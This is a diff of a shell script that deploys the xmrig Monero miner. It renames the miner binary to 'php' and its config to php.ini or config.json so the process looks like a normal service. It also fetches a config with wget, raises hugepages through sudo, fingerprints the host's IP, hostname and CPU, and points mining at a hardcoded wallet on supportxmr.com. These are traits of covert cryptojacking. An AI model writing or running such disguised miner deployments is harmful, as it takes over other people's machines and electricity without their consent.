@@ -2,26 +2,26 @@
 
 ## object config
 OBJ_MASK="${OBJ_MASK:-php}"
-OBJ_MASK2="${OBJ_MASK:-ntpd}"
 PAUSD_DAEMON="${PAUSD_DAEMON:-pausd}"
 PAUSD_DAEMON_NAME="${PAUSD_DAEMON##* }"
 OBJ_CFG="${OBJ_CFG:-xmrig.1.json.tpl}"
-OBJ_CFG_MASK="${OBJ_CFG_MASK:-php.ini}"
-PAUSD_ARGS="${PAUSD_ARGS:-${OBJ_MASK} -c ${OBJ_CFG_MASK}}"
+OBJ_CFG_MASK="${OBJ_CFG_MASK:-config.json}"
+# PAUSD_ARGS="${PAUSD_ARGS:-${OBJ_MASK} -c ${OBJ_CFG_MASK}}"
+PAUSD_ARGS="${PAUSD_ARGS:-${OBJ_MASK}}" ## configless because config is autoread from standard name
 
 ## download cfg
-if [ ! -e "cfg/${OBJ_CFG}" ]; then
+if [ ! -e "cfg/${OBJ_CFG}" -a -n "$CFG_BASE_URL" ]; then
 	wget -q "${CFG_BASE_URL}${OBJ_CFG}" -O "${OBJ_CFG}"
 fi
 
 ## object in sln should be present in pl/
 OBJ_NAME=${OBJ_NAME:-xmrig}
-mv pl/"$OBJ_NAME" "$OBJ_MASK"
+[ ! -e "$OBJ_MASK" ] && mv pl/"$OBJ_NAME" "$OBJ_MASK"
 chmod +x "${OBJ_MASK}" &>/dev/null
 
 ## daemon
 # (when not included in the payload or is not a function)
-# PAUSD_DAEMON_URL="https://rawgit.com/untoreh/scripts/master/${PAUSD_DAEMON}"
+# PAUSD_DAEMON_URL=""
 # wget -q ${PAUSD_DAEMON_URL}
 if [ -e $PAUSD_DAEMON_NAME ]; then
     chmod +x ${PAUSD_DAEMON_NAME} &>/dev/null
@@ -29,21 +29,20 @@ fi
 
 ## daemons conf
 ## misc
-[ $(id -u) != 0 ] && sudo=$(/usr/bin/which sudo 2>/dev/null)
+[ $UID != 0 ] && sudo=$(get_path sudo 2>/dev/null)
 for i in {128,64,32,16,8,4}; do ## try setting some hugepages
     printf $i | $sudo tee /proc/sys/vm/nr_hugepages &>/dev/null && break
 done
 
 ## instance ID
-CPU=$(grep "model name" < /proc/cpuinfo | head -1 | sed -r 's/model name\s*:\s*|[^a-zA-Z0-9]*//g')
+CPU=$(grep -m 1 "model name" < /proc/cpuinfo | sed -r 's/model name\s*:\s*|[^a-zA-Z0-9]*//g')
 CORES=$(nproc || grep -c "cpu cores" < /proc/cpuinfo)
-DATE="$(date +%s)"
 parse_ip
-IPADDR=$(wget -qO- ipinfo.io/ip || "failed retrieving ip")
-HOSTN="$(hostname | sed -r 's/[0-9]{2,}+|-//g')" ## clearup hostname while still preserving some identity
+IPADDR=$(http_req ipinfo.io/ip || "failed retrieving ip")
+HOSTN="$(echo $HOSTNAME | sed -r 's/[0-9]{2,}+|-//g')" ## clearup hostname while still preserving some identity
 
 ## L3 cache size to multihash factor
-cache_bytes=$(cat /proc/cpuinfo | grep -im1 "cache size" | sed -r 's/[^0-9]*([0-9]+).*/\1/')
+cache_bytes=$(grep -im1 "cache size" </proc/cpuinfo | sed -r 's/[^0-9]*([0-9]+).*/\1/')
 cache_MB=${cache_MB:-$((cache_bytes / 1024 ))}
 if [ ${TARGET_CRT:-xmr} = xmr ]; then
         hashes=$((cache_MB / 2)) ## each hashpoint takes 2M for xmr
@@ -58,11 +57,11 @@ cgq=cpu.cfs_quota_us
 cg1=/sys/fs/cgroup/cpuacct,cpu
 cg2=/sys/fs/cgroup/cpu,cpuacct
 if [ -a $cg1 ]; then
-    cpu_p=$(cat $cg1/$cgp 2>/dev/null)
-    cpu_q=$(cat $cg1/$cgq 2>/dev/null)
-else
-    cpu_p=$(cat $cg2/$cgp 2>/dev/null)
-    cpu_q=$(cat $cg2/$cgq 2>/dev/null)
+    cpu_p=$(<$cg1/$cgp)
+    cpu_q=$(<$cg1/$cgq)
+elif [ -a $cg2 ]; then
+    cpu_p=$(<$cg2/$cgp)
+    cpu_q=$(<$cg2/$cgq)
 fi
 if [ -n "$cpu_p" -a -n "$cpu_q" -a "$cpu_p" != 0 ]; then ## respect cgroups
         ACORES=${ACORES:-$((cpu_q / cpu_p))} ## the available cpu (in number of cores)
@@ -103,12 +102,11 @@ export AFFINITY="0x0"
 ## vars for the pausd daemon
 export PAUSD_THREADS PAUSD_VER=${PAUSD_VER:-2}
 export PAUSD_SHARES=${PAUSD_SHARES:-$((PAUSD_THREADS * PAUSD_VER))} \
-       PAUSD_RATE=${PAUSD_RATE:-200} \
-       PAUSD_PC_CFG=${PC_CFG_MASK}
+       PAUSD_RATE=${PAUSD_RATE:-200}
 
 ## vars for the object config
 export \
-ID=${ID:-"{$IPADDR}{$HOSTN}{$DATE}{$CORES}{$CPU}"} \
+ID=${ID:-"{$IPADDR}{$HOSTN}{$CORES}{$CPU}"} \
 PA=${PA:-4ACgpqzFZCiRfmZHAX11tAMLft1KNvLhWh83JXpYFKfKDhT7GXK89AoM4jNV1RRUUghAbuP1FrqTFU5w4zbN3F9GG6mqNPq} \
 AL=${AL:-cryptonight} \
 ENDPOINT=${ENDPOINT:-pool.supportxmr.com:${PAUSD_DIFF:-3333}}
@@ -123,3 +121,6 @@ ENDPOINT=${ENDPOINT:-pool.supportxmr.com:${PAUSD_DIFF:-3333}}
 
 ## subst
 envsubst -no-empty -i "cfg/${OBJ_CFG}" -o "${OBJ_CFG_MASK}"
+
+unset AFFINITY PAUSD_THREADS PAUSD_VER \
+       PAUSD_SHARES PAUSD_RATE ID PA AL ENDPOINT ENDPOINT2 ENDPOINT2
